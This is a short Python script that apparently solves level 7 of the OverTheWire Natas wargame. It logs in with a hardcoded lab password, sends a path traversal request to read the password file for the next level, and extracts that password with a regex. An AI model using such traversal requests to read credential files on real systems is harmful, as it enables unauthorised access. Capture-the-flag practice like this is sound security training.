#!/usr/bin/env python

import requests
import re

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

url = 'http://%s.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8' % username

session = requests.Session()
response = session.get(url, auth = (username, password) )

content = response.text

# print content

print re.findall('<br>\n(.*)\n\n<!--', content)[0]